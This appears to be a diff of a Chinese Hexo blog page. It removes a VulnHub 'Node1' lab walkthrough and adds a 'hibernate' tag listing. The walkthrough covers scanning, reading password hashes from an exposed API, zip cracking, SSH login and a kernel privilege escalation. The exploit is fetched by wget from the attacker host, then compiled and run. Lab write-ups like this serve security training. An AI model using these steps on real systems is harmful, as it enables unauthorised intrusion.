@@ -11,7 +11,7 @@
   <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-  <title>vulnhub靶机渗透Node1 | Godown_blog</title>
+  <title>标签: hibernate | Godown_blog</title>
 
   <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
   <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
@@ -578,800 +578,110 @@
 </header>
         <!-- 内容区域 -->
         
- <!-- prismjs 代码高亮 -->
- 
 
+<div class="bg-dark-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -2;"></div>
+<div class="bg-light-floor-tagDetail" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -3;"></div>
 
-<div class="bg-dark-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -1;"></div>
-
-
-  <!-- 文章详情页顶部图片和标题 -->
-
-
-
-
-<div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
-  background-position: center center;position: relative;background-image:url('https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B882.png')">
-  <div class="post-detail-header-mask"></div>
-  <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
-  
-  <div class="post-detail-header_info-box">
-    <div class="title-box">
-      <span class="title">
-        vulnhub靶机渗透Node1
-      </span>
-    </div>
-    
-    
+<div class="tag-header" style="background-image: url('https://pic1.zhimg.com/80/v2-604a15cef201cf177943af2d915eb2e7_1440w.jpg?source=1940ef5c');">
+  <div class="tag-header-title">
+    tag
   </div>
+  <div class="tag-header-desc">
   
-  
-    <script src="/js/bubble/bubble.js"></script>
-  
-</div>
-
-
-
-
-
-<div class="post-detail-content post-row" 
-  style="padding-top: 0px;">
-  <div class="main-content">
-    <article class="post post-detail">
-      <div class="post-content">
-        <h1 id="vulnhub靶机Node1"><a href="#vulnhub靶机Node1" class="headerlink" title="vulnhub靶机Node1"></a>vulnhub靶机Node1</h1><h2 id="一、有效资产收集"><a href="#一、有效资产收集" class="headerlink" title="一、有效资产收集"></a>一、有效资产收集</h2><table>
-<thead>
-<tr>
-<th>资产编号</th>
-<th>资产分类</th>
-<th>资产名称</th>
-<th>资产规格</th>
-<th>访问地址</th>
-<th>备注&#x2F;问题</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Node1</td>
-<td>主机系统</td>
-<td>Ubuntu操作系统</td>
-<td>Type:Linux<br />IP:192.168.101.137<br />Port:22、3000</td>
-<td>192.168.101.137</td>
-<td>越权，压缩包爆破，内核提权</td>
-</tr>
-</tbody></table>
-<p>flag：</p>
-<p>&#x3D;&#x3D;1722e99ca5f353b362556a62bd5e6be0&#x3D;&#x3D;</p>
-<p>靶机下载地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/[](https://so.csdn.net/so/search?q=node&spm=1001.2101.3001.7020)-1,252/">https://www.vulnhub.com/entry/[](https://so.csdn.net/so/search?q=node&amp;spm=1001.2101.3001.7020)-1,252/</a></p>
-<p>访问不到把网络模式改为NAT</p>
-<h2 id="二、渗透测试过程"><a href="#二、渗透测试过程" class="headerlink" title="二、渗透测试过程"></a>二、渗透测试过程</h2><p>kali攻击机ip为192.168.101.128</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230624215915330.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230624215915330.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<h3 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1. 信息收集"></a>1. 信息收集</h3><ul>
-<li>扫描存活主机：目标主机ip为192.168.101.137</li>
-</ul>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630144602088.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630144602088.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>或者Netdiscover</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630144643259.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630144643259.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<ul>
-<li>通过ping进行三层发现，根据ttl&#x3D;64初步推测该主机为Linux</li>
-</ul>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 192.168.101.137</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630144850868.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630144850868.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<ul>
-<li>通过masscan四层发现目标主机开放端口</li>
-</ul>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">masscan -p0-65535 --rate=10000 192.168.101.137</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630145106159.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630145106159.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>目标主机只开了两个端口，分别是22和3000端口</p>
-<ul>
-<li><p>扫描目标端口服务</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p- -sC -T4 -sS -P0 192.168.101.137 -oN nmap.A</span><br></pre></td></tr></table></figure></li>
-</ul>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630145455468.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630145455468.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<ul>
-<li>目标开启了以下端口及服务：<ul>
-<li>22端口，服务为OpenSSH 7.2p2;且系统为Ubunru 4 ubuntu2.2</li>
-<li>3000端口，服务为Apache。且扫描到了&#x2F;login路径，猜测是后台登录界面</li>
-</ul>
-</li>
-</ul>
-<blockquote>
-<p>nodejs默认端口3000，且nodejs是一个基于Chrome JavaScript运行建立的一个平台，基于Google V8引擎，性能很好</p>
-</blockquote>
-<p>使用Nmap中漏洞分类NSE脚本对目标进行探测</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV --script vuln 192.168.101.137</span><br></pre></td></tr></table></figure>
-
-<hr>
-<p>目标web服务为Node.js Express的站，其他漏洞信息没什么有效的，都是Dos（不算洞）</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630150143184.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630150143184.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>访问目标3000端口 web服务：</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630150036209.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630150036209.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>访问login路径：但是此页面没测出来弱密码和SQL</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630152103110.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630152103110.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<h3 id="2-越权"><a href="#2-越权" class="headerlink" title="2. 越权"></a>2. 越权</h3><p>在首页源码闲逛时，看到在<code>view-source:http://192.168.101.137:3000/assets/js/app/controllers/home.js</code>下</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> controllers = angular.<span class="title function_">module</span>(<span class="string">&#x27;controllers&#x27;</span>);</span><br><span class="line"></span><br><span class="line">controllers.<span class="title function_">controller</span>(<span class="string">&#x27;HomeCtrl&#x27;</span>, <span class="keyword">function</span> (<span class="params">$scope, $http</span>) &#123;</span><br><span class="line">  $http.<span class="title function_">get</span>(<span class="string">&#x27;/api/users/latest&#x27;</span>).<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">res</span>) &#123;</span><br><span class="line">    $scope.<span class="property">users</span> = res.<span class="property">data</span>;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>这段代码是一个AngularJS控制器，命名为HomeCtrl，接收scope和http两个参数。控制器中向服务器<code>/api/users/latest</code>发起GET请求，用then()处理相应并把数据赋给$scope.users</p>
-</blockquote>
-<p>跟随路径到&#x2F;api&#x2F;users&#x2F;latest，看到了用户名及其password的json数据，不过这里只有非管理员用户</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630153128915.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630153128915.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>再向上一级，找到管理员用户：</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630153300331.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630153300331.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>将管理员用户<code>myP14ceAdminAcc0uNT</code>的密码<code>dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af</code>拿到somd5解密：</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630153428460.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630153428460.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>密码为<code>manchester</code></p>
-<p>登录成功，网页中心有<code>Download backup</code>按钮</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630153509065.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630153509065.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<h3 id="3-爆破解压压缩包"><a href="#3-爆破解压压缩包" class="headerlink" title="3. 爆破解压压缩包"></a>3. 爆破解压压缩包</h3><p>下载下来看到是base64编码，解码：</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">base64</span> -d myplace.backup &gt; decode.backup</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630155720132.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630155720132.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>文件类型为zip：</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630155751094.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630155751094.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>解压需要密码：</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630155844544.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630155844544.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>用fcrackzip，字典rockyou进行爆破：</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt decode.backup</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630160151526.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630160151526.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>密码为magicword</p>
-<h3 id="4-ssh登录"><a href="#4-ssh登录" class="headerlink" title="4. ssh登录"></a>4. ssh登录</h3><p>unzip解压后出现var文件夹：</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630160806475.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630160806475.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>在app.js中定义的url常量，<code>mark:5AYRft73VtFpc84k@localhost:27017</code>很像ssh登录</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630160950825.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630160950825.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>尝试进行ssh登录：</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh mark@192.168.101.137</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630161239357.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630161239357.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<h3 id="5-ubuntu16-04内核提权"><a href="#5-ubuntu16-04内核提权" class="headerlink" title="5. ubuntu16.04内核提权"></a>5. ubuntu16.04内核提权</h3><ul>
-<li>查看用户的sudo权限：</li>
-</ul>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630161755572.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630161755572.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>mark用户不能使用sudo</p>
-<ul>
-<li>查看有suid的命令：</li>
-</ul>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630161845240.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630161845240.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>没有find这种提权的命令</p>
-<ul>
-<li>查看内核版本及操作系统版本：</li>
-</ul>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630161859489.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630161859489.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>内核版本为4.4.0-93，系统版本为ubuntu16.04</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630162035164.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630162035164.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<ul>
-<li>查看是否存在gcc和版本</li>
-</ul>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc --version</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630162058464.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630162058464.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>搜索ubuntu 16.04存在的漏洞：</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630163926335.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630163926335.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>把exp下载到本地：</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -m 44298.c</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630172752982.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630172752982.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>本地用python起一个web服务：</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -m SimpleHTTPServer 8000</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630173048686.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630173048686.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>靶机上cd到tmp目录下载exp</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">wget http://192.168.101.128:8000/44298.c</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630173213371.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630173213371.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>gcc编译执行exp:</p>
-<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc 44298.c -o exp</span><br><span class="line">./exp</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630173345884.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630173345884.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>在&#x2F;root目录下找到flag:</p>
-<p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630173408611.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20230630173408611.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
-<p>flag:&#x3D;&#x3D;1722e99ca5f353b362556a62bd5e6be0&#x3D;&#x3D;</p>
-
-      </div>
-      <div class="post-tags-categories">
-        
-        <div class="tags">
-          
-            <a href="/tags/vulnhub/" class="">
-              vulnhub
-            </a>
-          
-        </div>
-        
-      </div>
-      
-        <div class="copyright">
-  <ul class="post-copyright">
-    <li class="post-copyright-author">
-    <strong>作者:  </strong>GodownKai</a>
-    </li>
-    <li class="post-copyright-link">
-    <strong>文章链接:  </strong>
-    <a href="/2023/06/30/vulnhub-ba-ji-node1/" target="_blank" title="vulnhub靶机渗透Node1">https://godownio.github.io/2023/06/30/vulnhub-ba-ji-node1/</a>
-    </li>
-    <li class="post-copyright-license">
-      <strong>版权声明:   </strong>
-      本网站所有文章除特别声明外,均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
-      许可协议。转载请注明出处!
-    </li>
-  </ul>
-<div>
-      
-    </article>
-    <!-- 上一篇文章和下一篇文章 -->
-    
-      <!-- 文章详情页的上一页和下一页 -->
-<div class="post-nav">
-
-
-
-  
-  <div class="post-nav-prev post-nav-item">
-    <div class="post-nav-img" style="background-size: cover; 
-      background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B884.jpg" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B884.jpg" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="">
-    </div>
-    <a href="/2024/03/01/kao-yan-c-suan-fa-lian-xi/" class="post-nav-link">
-      <div class="title">
-        <i class="fas fa-angle-left"></i> 上一篇:
-        <div class="title-text">C++算法练习</div>
-      </div>
-      
-      <!-- <div class="content">
-        算法练习（C++代码）快速幂算法题目：输入一个整数 n ，求 n^n 的个位数是多少。
-
-快速幂算法：指数为偶数，则底数
-      </div> -->
-    </a>
-  </div>
-
-
-
-  
-  <div class="post-nav-next post-nav-item">
-    <div class="post-nav-img" style="background-size: cover; 
-      background-position: center center;">
-      <img class="lazyload lazyload placeholder" src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B875.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B875.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" src="" alt="">
-    </div>
-    <a href="/2023/06/29/vulnhub-ba-ji-ch4inrulz-v1.0.1/" class="post-nav-link">
-      <div class="title">
-        下一篇: <i class="fas fa-angle-right"></i>
-        <div class="title-text">vulnhub靶机渗透CH4INRULZ_v1.0.1</div>
-      </div>
-      <!-- <div class="content">
-        CH4INRULZ_v1.0.1一、有效资产收集
-
-
-资产编号
-资产分类
-资产名称
-资产规格
-访问地址
-备注&#x2F;
-      </div> -->
-    </a>
-  </div>
-
-</div>
-
-    
-    
-
-    <!-- 打赏 -->
-    
-      <div id="appDonate" class="post-donate">
-  <div id="donate_board" class="donate_bar center" ref="donate">
-    <a id="btn_donate" class="btn_donate" href="javascript:;" title="打赏" @click="showDialogDrawer()"></a>
-  </div>
-  <transition name="fade">
-    <div 
-      class="donate-box-mask"
-      v-cloak 
-      v-show="visible"
-      @click="cancelDialogDrawer()"
-    >
-    </div>
-  </transition>
-  <transition name="bounce">
-    <div class="donate-box" v-cloak v-show="visible">
-      <div class="donate-box_close">
-        <i class="fas fa-times" aria-hidden="true" @click="cancelDialogDrawer" pointer></i>
-      </div>
-      <div class="donate-box_title">
-        <h4>
-          慧眼识珠牢弟
-        </h4>
-      </div>
-      <div class="donate-box_tab">
-        <div class="Alipay" pointer :class="{'active': tabActive === 'Alipay'}" @click="changeTabActive('Alipay')">
-          支付宝
-        </div>
-        <div class="WeChatpay" pointer :class="{'active': tabActive === 'WeChatpay'}" @click="changeTabActive('WeChatpay')">
-          微信
-        </div>
-      </div>
-      <div class="donate-box_img">
-        <div class="AlipayImg" v-show="tabActive === 'Alipay'">
-          <img src="/" class="lazyload placeholder" data-srcset="/" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="支付宝打赏" />
-        </div> 
-        <div class="WeChatpayImg" v-show="tabActive === 'WeChatpay'">
-          <img src="/" class="lazyload placeholder" data-srcset="/" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="微信打赏" />
-        </div>
-      </div>
-    </div>
-  </transition>
-</div>
-
-<script>
-  var body = document.body || document.documentElement || window;
-  var vm = new Vue({
-    el: '#appDonate',
-    data: {
-      visible: false,
-      tabActive: 'Alipay',
-      top: 0,
-    },
-    computed: {
-    },
-    mounted() {
-    },
-    methods: {
-      showDialogDrawer() {
-        this.visible = true;
-        // 防止页面滚动，只能让弹框滚动
-        // function getScroll() {
-        //   return {
-        //     left: window.pageXOffset || document.documentElement.scrollLeft || document.body.scrollLeft || 0,
-        //     top: window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0
-        //   };
-        // }
-        this.top = $(document).scrollTop() // or getScroll().top
-        // console.log('aa', $('.main-content'));
-        body.style.cssText = 'overflow: hidden;';
-      },
-      cancelDialogDrawer() {
-        this.visible = false;
-        body.removeAttribute('style');
-        $(document).scrollTop(this.top)
-      },
-      changeTabActive(name) {
-        this.tabActive = name;
-      }
-    },
-    created() {}
-  })
-</script>
-    
-
-    <!-- 分享 -->
-    
-      <!-- https://github.com/overtrue/share.js -->
-<!-- 文章详情页的分享 -->
-<div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
-
-<script src="/js/shareJs/social-share.min.js"></script>
-</script>
-
-<style>
-  .social-share {
-    margin: 20px 0;
+    <span class="title" id="tag-header-desc"></span>
+    <script>
+  function typedFn() {
+    const el = '#tag-header-desc';
+    const type = 'tagDetail';
+    let desc = '愿你如风，被人温柔以待'
+    var typed = new Typed(el, {
+      strings: [desc],
+      startDelay: 100,
+      typeSpeed: 100,
+      loop: true,
+      backSpeed: 50,
+      showCursor: true
+    });
   }
-</style>
-
-
-    
-    
-    <!-- 评论 -->
-    <!-- 评论 -->
-
-  <div id="myComment">
-    
-      <div id="gitment-container"></div>
-
+  typedFn();
+</script>
     
   </div>
+  <div class="mask-box"></div>
+</div>
 
-<!-- comment script in themes\hexo-theme-bamboo\layout\_partial\scripts\index.ejs -->
 
 
+<div class="tag">
+  <div class="tag-name">
+    <div class="name" style="background-color: #85C1E9;">hibernate 分类</div>
   </div>
+  <!-- 每一篇文章卡片 -->
+  <!-- hash算法 -->
 
-  <!-- 目录 -->
-  <aside id='l_side'>
+<section class="posts">
   
     
-      <section class="widget side_blogger">
-  <div class='content'>
-    
-      
-        <a class='avatar flat-box rectangle' href='/about/'>
-          <img src='https://pic2.zhimg.com/80/v2-42b72d5ebee4b8d8aa70d9687effe87b_1440w.webp'/>
+    <article class="post reveal" style="flex-direction: row-reverse;   ">
+      <div class="post-main">
+        <div class="post-info">
+          <div class="post-time">
+            <i class="fas fa-clock" aria-hidden="true"></i>
+            <span class="post-time">2025-12-30</span>
+          </div>
+          <div class="post-title">
+            <a class="post-title-link" href="/2025/12/30/hibernate-fan-xu-lie-hua/">hibernate反序列化</a>
+          </div>
+          <div class="post-meta">
+            <div class="post-tags">
+              <!-- 文章详情页的标签 -->
+
+    <i class="iconfont icontag"></i>
+    <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hibernate/" rel="tag">hibernate</a></li></ul>
+
+            </div>
+            <div class="post-categories">
+              <!-- 文章详情页的分类 -->
+
+<div class="article-category">
+  <i class="iconfont iconbookmark1"></i>
